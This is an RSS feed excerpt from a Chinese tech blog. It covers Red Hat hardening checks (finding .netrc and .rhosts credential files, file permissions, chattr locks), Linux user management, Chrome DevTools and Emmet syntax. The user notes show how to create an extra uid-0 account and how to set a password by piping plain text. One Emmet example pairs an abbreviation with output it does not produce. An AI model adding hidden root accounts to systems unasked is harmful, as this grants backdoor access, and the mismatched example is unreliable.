<div><pre><code><span>find</span> / -name .netrc
<span>find</span> / -name .rhosts
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="重要目录和文件的权限设置" tabindex="-1"> 重要目录和文件的权限设置</h2>
<p>执行以下命令检查目录和文件的权限设置情况</p>
<div><pre><code><span>ls</span> -l /etc/
<span>ls</span> -l /etc/rc.d/init.d/
<span>ls</span> -l /tmp
<span>ls</span> -l /etc/inetd.conf
<span>ls</span> -l /etc/passwd
<span>ls</span> -l /etc/shadow
<span>ls</span> -l /etc/group
<span>ls</span> -l /etc/security
<span>ls</span> -l /etc/services
<span>ls</span> -l /etc/rc*.d
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>对于重要目录, 建议执行如下类似操作, <code>For Exmaple:</code></p>
<div><pre><code><span>chmod</span> -R <span>750</span> /etc/rc.d/init.d/*
</code></pre><div aria-hidden="true"><div></div></div></div><p>这样只有 root 可以读、写和执行, 编写脚本一次性执行, <code>For Exmaple:</code></p>
<div><pre><code><span>chmod</span> <span>644</span> /etc/passwd
<span>chmod</span> <span>600</span> /etc/shadow
<span>chmod</span> <span>644</span> /etc/group
<span>chmod</span> <span>600</span> /etc/gshadow
<span>chmod</span> <span>700</span> /bin/rpm
<span>chmod</span> <span>644</span> /usr/bin/xhost
<span>chmod</span> <span>664</span> /etc/hosts
<span>chmod</span> <span>644</span> /etc/exports
<span>chmod</span> <span>644</span> /etc/issue
<span>chmod</span> <span>664</span> /var/log/wtmp
<span>chmod</span> <span>644</span> /etc/services
<span>chmod</span> <span>600</span>  /etc/xinetd.conf
<span>chmod</span> <span>600</span> /etc/login.defs
<span>chmod</span> <span>600</span> /etc/hosts.allow
<span>chmod</span> <span>600</span> /etc/hosts.deny
<span>chmod</span> <span>600</span> /etc/securetty
<span>chmod</span> <span>600</span> /etc/ssh/ssh_host_key
<span>chmod</span> <span>600</span> /etc/ssh/sshd_config
<span>chmod</span> <span>600</span> /var/log/lastlog
<span>chmod</span> <span>600</span> /var/log/messages
<span>chmod</span> <span>600</span> /etc/security
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>注意影响</p>
<p>有的移动安全加固标准要求/etc 目录是 750 权限, 但如果/etc 目录是权限是 750（drwxr-x---）的话, 由于其他组没有 x 权限, 那么普通用户就无权访问/etc 目录以及以下所有文件, 用户获取不到基本的环境变量/etc/profile 和/etc/passwd、group 等文件, 一些基本命令都会出现问题, 本用户的文件只有 uid、gid, 无法对应名用户名称和组名称。</p>
</div>
<h2 id="检查任何人都有写权限的目录" tabindex="-1"> 检查任何人都有写权限的目录</h2>
<p><code>For Exmaple:</code></p>
<div><pre><code><span>find</span> / -type d -perm -0222 -exec <span>ls</span> -ldg <span>{</span><span>}</span> <span>\</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p>这些目录是存放每个用户临时文件的, 目录本身是带 <code>Sticky BIT</code> 粘滞位的, 即使里面的文件有 <code>o+w</code> 权限也没问题, 系统本身有保护性措施。</p>
</div>
<h2 id="查找任何人都有写权限的文件" tabindex="-1"> 查找任何人都有写权限的文件</h2>
<p><code>For Exmaple:</code></p>
<div><pre><code><span>find</span> / -type f -perm -0222 -exec <span>ls</span> -lg <span>{</span><span>}</span> <span>\</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/redhat-reinforce-14.png" alt="RedHat 安全加固"></p>
<h2 id="检查没有属主的文件" tabindex="-1"> 检查没有属主的文件</h2>
<p><code>For Exmaple:</code></p>
<div><pre><code><span>find</span> / -nouser -o -nogroup -print
</code></pre><div aria-hidden="true"><div></div></div></div><p>发现没有属主的文件往往就意味着有黑客入侵你的系统了。不能允许没有主 人的文件存在。如果在系统中发现了没有属主的文件或目录, 先查看它的完 整性, 如果一切正常, 给它一个属主。有时候卸载程序可能会出现一些没有 主人的文件或目录, 在这种情况下可以把这些文件和目录删除掉。</p>
<p>在安全加固脚本中, 把没有属主或属组的文件直接赋予了 <code>nobody</code> 用户和组, <code>For Exmaple:</code></p>
<div><pre><code><span>find</span> / -path <span>"/proc"</span> -prune -nouser -o -nogroup -exec <span>chown</span> nobody:nobody <span>{</span><span>}</span> <span>\</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p>命令中排除了 /proc 目录</p>
</div>
<h2 id="检查异常隐含文件" tabindex="-1"> 检查异常隐含文件</h2>
<p><code>For Exmaple:</code></p>
<div><pre><code><span>find</span> / -xdev -name <span>"..*"</span> -print
<span>find</span> / -xdev -name <span>"...*"</span> -print
<span>find</span> / -xdev -name <span>"..^G"</span> -print
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>同时也要注意象 <code>“.xx”</code> 和 <code>“.mail”</code> 这样的文件名的。（这些文件名看起来都很象正常的文件名）在系统的每个地方都要查看一下有没有异常隐含文件（点号是起始字符的, 用 <code>“ls”</code> 命令看不到的文件）, 因为这些文件可能是隐藏的黑客工具或者其它一些信息（口令破解程序、其它系统的口令文件, 等等）。在 <code>UNIX</code> 下, 一个常用的技术就是用一些特殊的名, 如: <code>“...”</code> 、 <code>“.. ”（点点空格</code> ）或 <code>“..^G”（点点 ctrl+v 和 ctrl+G）</code> , 来隐含文件或目录。</p>
<p>基本上系统默认只有一个文件 <code>/usr/share/man/man1/..1.gz</code> , 在加固脚本中的处理方式是存在就直接把它删除掉。<br></p>
<p><img src="/assets/redhat-reinforce-15.png" alt="RedHat 安全加固"></p>
<h2 id="加锁重要口令文件和组文件" tabindex="-1"> 加锁重要口令文件和组文件</h2>
<p>可以用下面的命令给口令文件和组文件设置不可改变位加锁, <code>For Exmaple:</code></p>
<div><pre><code>chattr +i /etc/passwd
chattr +i /etc/shadow
chattr +i /etc/group
chattr +i /etc/gshadow
chattr +i /etc/xinetd.conf
chattr +i /etc/services
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>加锁后, 就不能被改变文件内容。同时会影响 <code>useradd</code> 、 <code>userdel</code> 等跟帐户相关的操作</p>
<p>查看命令, <code>For Exmaple:</code></p>
<div><pre><code>lsattr /etc/passwd
</code></pre><div aria-hidden="true"><div></div></div></div><p>返回结果为: <code>----i-------- /etc/passwd</code> 如果要修改文件, 必须先对该文件进行解锁, <code>For Exmaple:</code></p>
<div><pre><code>chattr -i /etc/passwd
chattr -i /etc/shadow
chattr -i /etc/group
chattr -i /etc/gshadow
chattr -i /etc/xinetd.conf
chattr -i /etc/services
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/redhat-reinforce-12.png" type="image/png"/>
    </item>
    <item>
      <title>Liunx 学习笔记（六）用户的管理</title>
      <link>https://vxhly.github.io/views/liunx/user-management.html</link>
      <guid>https://vxhly.github.io/views/liunx/user-management.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Liunx 学习笔记（六）用户的管理</source>
      <description>前言
本篇是 Liunx 的学习笔记系列第五篇, 这一篇将介绍 Liunx 下用户的管理。用户管理看似很简单, 但是里面还隐藏着大学问呢。

</description>
      <category>liunx</category>
      <pubDate>Fri, 07 Oct 2016 11:31:32 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本篇是 Liunx 的学习笔记系列第五篇, 这一篇将介绍 Liunx 下用户的管理。用户管理看似很简单, 但是里面还隐藏着大学问呢。</p>
</div>

<h2 id="添加用户-并创建用户宿主目录" tabindex="-1"> 添加用户, 并创建用户宿主目录</h2>
<p><code>For Example:</code></p>
<div><pre><code><span>useradd</span> -m <span>[</span>userName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="删除用户-并删除用户宿主目录" tabindex="-1"> 删除用户, 并删除用户宿主目录</h2>
<p><code>For Example:</code></p>
<div><pre><code><span>userdel</span> -r <span>[</span>userName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="添加-uid-为-0-的用户" tabindex="-1"> 添加 uid 为 0 的用户</h2>
<p><code>For Example:</code></p>
<div><pre><code><span>useradd</span> -u <span>0</span> -o <span>[</span>userName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="查看用户的-uid-或-gid-等信息" tabindex="-1"> 查看用户的 uid 或 gid 等信息</h2>
<p><code>For Example:</code></p>
<div><pre><code><span>id</span> <span>[</span>userName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="为用户添加密码" tabindex="-1"> 为用户添加密码</h2>
<p><code>For Example:</code></p>
<div><pre><code><span>passwd</span> <span>[</span>userName<span>]</span>                                   <span># 普通方法</span>
<span>echo</span> <span>"passwd string"</span> <span>|</span> <span>passwd</span> --stdin <span>[</span>userName<span>]</span>    <span># 输出文本内容作为密码</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>普通用户修改密码命令: passwd</p>
<h2 id="查看用户的密码状态" tabindex="-1"> 查看用户的密码状态</h2>
<p><code>For Example:</code></p>
<div><pre><code><span>passwd</span> -S <span>[</span>userName<span>]</span>                      <span># 普通方法</span>
<span>cat</span> /etc/passwd <span>|</span> <span>grep</span> <span>[</span>userName<span>]</span>         <span># 查看配置文件</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="禁用和解锁用户" tabindex="-1"> 禁用和解锁用户</h2>
<h3 id="passwd-方法" tabindex="-1"> passwd 方法</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>passwd</span> -l <span>[</span>userName<span>]</span>    <span># 禁用</span>
<span>passwd</span> -u <span>[</span>userName<span>]</span>    <span># 解锁</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="修改-etc-shadow-文件-root-用户" tabindex="-1"> 修改 /etc/shadow 文件（root 用户）</h2>
<p><code>For Example:</code></p>
<div><pre><code><span>vim</span> /etc/shadow
</code></pre><div aria-hidden="true"><div></div></div></div><p>禁用则在密码位前手工添加 <code>!</code> （启用删除 <code>!</code> 即可）</p>
<div><pre><code>test:<span>!</span><span>$1</span><span>$afiVSYfG</span><span>$utdc2qWLNrqNcy63Ca8301</span>:16998:0:99999:7:::     <span># 只加一个 ！</span>
test:<span>!</span><span>!</span><span>$1</span><span>$afiVSYfG</span><span>$utdc2qWLNrqNcy63Ca8301</span>:16998:0:99999:7:::    <span># 加两个,效果一致</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>使用 <code>:wq!</code> 强制保存, 因为其权限为 <code>000</code></p>
<h3 id="usermod-方法" tabindex="-1"> usermod 方法</h3>
<p><code>For Example:</code></p>
<div><pre><code><span>usermod</span> -L <span>[</span>userName<span>]</span>    <span># 禁用</span>
<span>usermod</span> -U <span>[</span>userName<span>]</span>    <span># 解锁</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="设置用户一登录就要修改密码" tabindex="-1"> 设置用户一登录就要修改密码</h2>
<p><code>For Example:</code></p>
<div><pre><code>chage -d <span>0</span> <span>[</span>userName<span>]</span>
<span># 这个命令其实是把密码修改日期归 0 了 （/etc/shadow 文件第 3 个字段）</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="查看当前登录的用户是谁" tabindex="-1"> 查看当前登录的用户是谁</h2>
<p><code>For Example:</code></p>
<div><pre><code><span>whoami</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="查看当前登录的用户的环境变量" tabindex="-1"> 查看当前登录的用户的环境变量</h2>
<p><code>For Example:</code></p>
<div><pre><code><span>env</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="切换用户" tabindex="-1"> 切换用户</h2>
<p><code>For Example:</code></p>
<div><pre><code><span>su</span> - <span>[</span>userName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>关于 Chrome 浏览器的调试方法</title>
      <link>https://vxhly.github.io/views/manual/debug-for-chrome-browser.html</link>
      <guid>https://vxhly.github.io/views/manual/debug-for-chrome-browser.html</guid>
      <source url="https://vxhly.github.io/rss.xml">关于 Chrome 浏览器的调试方法</source>
      <description>前言
作为前端开发人员, 最佳的调试环境便是浏览器自带的开发者工具, 此文则介绍 Chrome 浏览器的开发者工具的使用方法。

</description>
      <category>manual</category>
      <pubDate>Fri, 05 Aug 2016 18:24:29 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>作为前端开发人员, 最佳的调试环境便是浏览器自带的开发者工具, 此文则介绍 Chrome 浏览器的开发者工具的使用方法。</p>
</div>

<h2 id="chrome-浏览器调试窗口中常用的标签页" tabindex="-1"> Chrome 浏览器调试窗口中常用的标签页</h2>
<ul>
<li><strong>Elements</strong>: 用于查看页面 <code>html</code> 代码</li>
<li><strong>NetWork</strong>: 用于查看页面的网络请求</li>
<li><strong>Sources</strong>: 用于查看页面所加载的源文件</li>
<li><strong>Timeline</strong>: 用于查看页面加载 <code>JavaScript</code> 、页面元素渲染等的时间</li>
<li><strong>Profiles</strong>: 用于做性能优化的, 包括查看 CPU 执行时间与内存占用</li>
<li><strong>Resource</strong>s: 用于查看保存再本地的一些信息, 比如 <code>cookie</code> 等</li>
<li><strong>Audits</strong>: 一般用于优化前端页面、加速网页加载速度</li>
<li><strong>Console</strong>: <code>JavaScript</code> 控制台, 这个面板可以查看错误信息、打印调试信息、写一些测试脚本, 还可以当作 <code>JavaScript API</code> 查看用。</li>
</ul>
<p>Chrome 浏览器不仅可以调试页面、 JavaScript、请求、资源、 cookie, 还可以模拟手机进行调试</p>
<h2 id="打开调试方法" tabindex="-1"> 打开调试方法</h2>
<h3 id="方法一" tabindex="-1"> 方法一</h3>
<p>直接在页面上点击右键, 然后选择审查元素</p>
<p><img src="/assets/open-browser-debug-1.png" alt="打开调试方法"></p>
<h3 id="方法二" tabindex="-1"> 方法二</h3>
<p>在 Chrome 的工具中找到开发者工具</p>
<p><img src="/assets/open-broswer-debug-2.png" alt="打开调试方法"></p>
<h4 id="方法三" tabindex="-1"> 方法三</h4>
<p>使用快捷键 Ctrl+Shift+I (或者 Ctrl+Shift+J 直接打开控制台), 或者直接按 F12</p>
<p><img src="/assets/open-browser-debug-3.png" alt="打开调试方法"></p>
<h3 id="elements-标签页" tabindex="-1"> Elements 标签页</h3>
<p>Elements 标签页的左侧就是对页面 HTML 结构的查看与编辑, 你可以直接在某个元素上双击修改元素的属性。</p>
<p><img src="/assets/broswer-debug-elements-1.png" alt="Elements 标签页"></p>
<ul>
<li><strong>Add attribute</strong>: 向该元素添加其他的属性</li>
<li><strong>Edit as HTML</strong>: 直接对元素的 <code>HTML</code> 进行编辑, 或者删除某个元素, 所有的修改都会即时在页面上得到呈现。</li>
<li><strong>Copy</strong>: 可以将 <code>HTML</code> 代码直接复制下来, 在拷贝别人网站上面的 <code>HTML</code> 代码的时候灰常方便, 你懂的~~</li>
<li><strong>Hide element</strong>: 隐藏该元素</li>
<li><strong>Delete element</strong>: 删掉该元素</li>
<li><strong>Scroll into view</strong>: 视图滚动到选择的位置</li>
<li><strong>Break on</strong>: 可以对某个元素进行监听, 在 <code>JavaScript</code> 中对元素的属性或者 <code>HTML</code> 进行修改的时候, 直接触发断点, 跳转到对改元素进行修改的 <code>JavaScript</code> 代码处</li>
</ul>
<p>Elements 标签页的右侧可以对元素的 CSS 进行查看与编辑修改</p>
<p><img src="/assets/broswer-debug-elements-2.png" alt="Elements 标签页"></p>
<ul>
<li><strong>Styles</strong>: 看 <code>HTML</code> 元素的样式</li>
<li><strong>Computed</strong>: 可以看元素的盒子模型</li>
<li><strong>Event Listeners</strong>: 对元素的监听方法将会显示在这里</li>
<li><strong>DOM Breakpoints</strong>: <code>DOM</code> 树的断点调试, （通过右键某一个元素, 依次选择 <code>Break on</code> , 选择 <code>Attributes modifications</code> ）, 设置后刷新页面, 当元素的属性发生改变时, 暂停脚本并定位到该位置</li>
<li><strong>Properties</strong>: 可以查看到元素具有的方法与属性, 比查 <code>API</code> 手册要方便得多</li>
</ul>
<h2 id="network-标签页" tabindex="-1"> Network 标签页</h2>
<p>Network 标签页对于分析网站请求的网络情况、查看某一请求的请求头和响应头还有响应内容很有用。 注意是在你打开 Chrome 开发者工具后发起的请求, 才会在这里显示的哦。</p>
<p><img src="/assets/browser-debug-network-1.png" alt="Network 标签页"></p>
<p>点击左侧某一个具体请求 URL, 可以看到该请求的详细 HTTP 请求情况</p>
<p><img src="/assets/browser-debug-network-2.png" alt="Network 标签页"></p>
<p>我们可以在这里看到 <code>HTTP 请求头</code> 、 <code>HTTP 响应头</code> 、 <code>HTTP 返回的内容</code> 等信息。</p>
<ul>
<li><strong>Headers</strong>: 请求头信息和响应头信息</li>
<li><strong>Preview</strong>: 预览结果, 如果是文件可以查看这个文件；如果是图片可以预览这个图片；如果是从服务器返回来的 <code>JSON</code> 数据, 可以查看格式话后的 <code>JSON</code></li>
<li><strong>Response</strong>: 从服务器返回的响应结果</li>
<li><strong>Cookies</strong>: 请求和响应的 <code>Cookie</code></li>
<li><strong>Timing</strong>: 具体的响应时间</li>
</ul>
<p><img src="/assets/browser-debug-network-4.png" alt="Network 标签页"></p>
<br>
<p><img src="/assets/browser-debug-network-5.png" alt="Network 标签页"></p>
<br>
<p><img src="/assets/browser-debug-network-6.png" alt="Network 标签页"></p>
<h2 id="sources-标签页" tabindex="-1"> Sources 标签页</h2>
<p>Sources 标签页可以查看到请求的资源情况, 包括 CSS、 JavaScript、图片等的内容。也可以设置各种断点。对存储的内容进行编辑然后保存也会实时的反应到页面上。</p>
<p><img src="/assets/browser-debug-sources-1.png" alt="Sources 标签页"></p>
<h2 id="audits-标签页" tabindex="-1"> Audits 标签页</h2>
<p>这个对于优化前端页面、加速网页加载速度很有用哦。（相当与 Yslow）</p>
<p><img src="/assets/browser-debug-audits-3.png" alt="Audits 标签页"></p>
<h2 id="console-标签页" tabindex="-1"> Console 标签页</h2>
<p>JavaScript 控制台, 前端开发人员最经常使用它来调试 js 的错误。</p>
<p><img src="/assets/browser-debug-console-1.png" alt="Console 标签页"></p>
<br>
<p><img src="/assets/browser-debug-console-2.png" alt="Console 标签页"></p>
<h2 id="移动端开发调试" tabindex="-1"> 移动端开发调试</h2>
<p>可以模拟出不同分辨率的移动端显示的效果, 此效果仅供参考, 因为还有可能受浏览器的不同而显示效果不同。</p>
<p><img src="/assets/browser-debug-moblie-1.png" alt="移动端开发调试"></p>
<br>
<p><img src="/assets/browser-debug-moblie-2.png" alt="移动端开发调试"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/open-browser-debug-1.png" type="image/png"/>
    </item>
    <item>
      <title>Emmet 用法举例</title>
      <link>https://vxhly.github.io/views/manual/emmet-usage-examples.html</link>
      <guid>https://vxhly.github.io/views/manual/emmet-usage-examples.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Emmet 用法举例</source>
      <description>前言
Emmet 的前身是大名鼎鼎的 Zen coding。如果你从事 Web 前端开发的话, 对该插件一定不会陌生。它使用仿 CSS 选择器的语法来代码, 大大提高了 HTML/CSS 代码编写的速度。

</description>
      <category>manual</category>
      <pubDate>Thu, 04 Aug 2016 13:20:34 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Emmet 的前身是大名鼎鼎的 Zen coding。如果你从事 Web 前端开发的话, 对该插件一定不会陌生。它使用仿 CSS 选择器的语法来代码, 大大提高了 HTML/CSS 代码编写的速度。</p>
</div>

<h2 id="子元素" tabindex="-1"> 子元素: &gt;</h2>
<h3 id="例子" tabindex="-1"> 例子</h3>
<p><code>nav&gt;ul&gt;li</code></p>
<div><pre><code><span><span><span>&lt;</span>nav</span><span>></span></span>
  <span><span><span>&lt;</span>ul</span><span>></span></span>
    <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;/</span>ul</span><span>></span></span>
<span><span><span>&lt;/</span>nav</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="兄弟元素" tabindex="-1"> 兄弟元素: +</h2>
<h3 id="例子-1" tabindex="-1"> 例子</h3>
<p><code>div+p+bq</code></p>
<div><pre><code><span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;</span>p</span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>
<span><span><span>&lt;</span>blockquote</span><span>></span></span><span><span><span>&lt;/</span>blockquote</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="在某个元素之上" tabindex="-1"> 在某个元素之上: ^</h2>
<h3 id="例子一" tabindex="-1"> 例子一</h3>
<p><code>div+div&gt;p&gt;span+em^bq</code></p>
<div><pre><code><span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;</span>div</span><span>></span></span>
  <span><span><span>&lt;</span>p</span><span>></span></span><span><span><span>&lt;</span>span</span><span>></span></span><span><span><span>&lt;/</span>span</span><span>></span></span><span><span><span>&lt;</span>em</span><span>></span></span><span><span><span>&lt;/</span>em</span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>
  <span><span><span>&lt;</span>blockquote</span><span>></span></span><span><span><span>&lt;/</span>blockquote</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="例子二" tabindex="-1"> 例子二</h3>
<p><code>div+div&gt;p&gt;span+em^^bq</code></p>
<div><pre><code><span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;</span>div</span><span>></span></span>
  <span><span><span>&lt;</span>p</span><span>></span></span><span><span><span>&lt;</span>span</span><span>></span></span><span><span><span>&lt;/</span>span</span><span>></span></span><span><span><span>&lt;</span>em</span><span>></span></span><span><span><span>&lt;/</span>em</span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;</span>blockquote</span><span>></span></span><span><span><span>&lt;/</span>blockquote</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="分为一组" tabindex="-1"> 分为一组: ()</h2>
<h3 id="例子一-1" tabindex="-1"> 例子一</h3>
<p><code>div&gt;(header&gt;ul&gt;li*2&gt;a)+footer&gt;p</code></p>
<div><pre><code><span><span><span>&lt;</span>div</span><span>></span></span>
  <span><span><span>&lt;</span>header</span><span>></span></span>
    <span><span><span>&lt;</span>ul</span><span>></span></span>
      <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>"</span><span>"</span></span><span>></span></span><span><span><span>&lt;/</span>a</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
      <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>"</span><span>"</span></span><span>></span></span><span><span><span>&lt;/</span>a</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
    <span><span><span>&lt;/</span>ul</span><span>></span></span>
  <span><span><span>&lt;/</span>header</span><span>></span></span>
  <span><span><span>&lt;</span>footer</span><span>></span></span>
    <span><span><span>&lt;</span>p</span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>
  <span><span><span>&lt;/</span>footer</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="例子二-1" tabindex="-1"> 例子二</h3>
<p><code>(div&gt;dl&gt;(dt+dd)*3)+footer&gt;p</code></p>
<div><pre><code><span><span><span>&lt;</span>div</span><span>></span></span>
  <span><span><span>&lt;</span>dl</span><span>></span></span>
    <span><span><span>&lt;</span>dt</span><span>></span></span><span><span><span>&lt;/</span>dt</span><span>></span></span>
    <span><span><span>&lt;</span>dd</span><span>></span></span><span><span><span>&lt;/</span>dd</span><span>></span></span>
    <span><span><span>&lt;</span>dt</span><span>></span></span><span><span><span>&lt;/</span>dt</span><span>></span></span>
    <span><span><span>&lt;</span>dd</span><span>></span></span><span><span><span>&lt;/</span>dd</span><span>></span></span>
    <span><span><span>&lt;</span>dt</span><span>></span></span><span><span><span>&lt;/</span>dt</span><span>></span></span>
    <span><span><span>&lt;</span>dd</span><span>></span></span><span><span><span>&lt;/</span>dd</span><span>></span></span>
  <span><span><span>&lt;/</span>dl</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;</span>footer</span><span>></span></span>
  <span><span><span>&lt;</span>p</span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>
<span><span><span>&lt;/</span>footer</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="倍增元素" tabindex="-1"> 倍增元素: *</h2>
<h3 id="例子-2" tabindex="-1"> 例子</h3>
<p><code>ul&gt;li*5</code></p>
<div><pre><code><span><span><span>&lt;</span>ul</span><span>></span></span>
  <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
<span><span><span>&lt;/</span>ul</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="项目数字递增" tabindex="-1"> 项目数字递增: $</h2>
<h3 id="例子一-2" tabindex="-1"> 例子一</h3>
<p><code>ul&gt;li.item$*5</code></p>
<div><pre><code><span><span><span>&lt;</span>ul</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item1<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item2<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item3<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item4<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item5<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
<span><span><span>&lt;/</span>ul</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="例子二-2" tabindex="-1"> 例子二</h3>
<p><code>h$[title=item$]{Header $}*3</code></p>
<div><pre><code><span><span><span>&lt;</span>h1</span> <span>title</span><span><span>=</span><span>"</span>item1<span>"</span></span><span>></span></span>Header 1<span><span><span>&lt;/</span>h1</span><span>></span></span>
<span><span><span>&lt;</span>h2</span> <span>title</span><span><span>=</span><span>"</span>item2<span>"</span></span><span>></span></span>Header 2<span><span><span>&lt;/</span>h2</span><span>></span></span>
<span><span><span>&lt;</span>h3</span> <span>title</span><span><span>=</span><span>"</span>item3<span>"</span></span><span>></span></span>Header 3<span><span><span>&lt;/</span>h3</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="例子三" tabindex="-1"> 例子三</h3>
<p><code>ul&gt;li.item$*5</code></p>
<div><pre><code><span><span><span>&lt;</span>ul</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item001<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item002<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item003<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item004<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item005<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
<span><span><span>&lt;/</span>ul</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="例子四" tabindex="-1"> 例子四</h3>
<p><code>ul&gt;li.item$@-*5</code></p>
<div><pre><code><span><span><span>&lt;</span>ul</span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>"</span>item5<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>
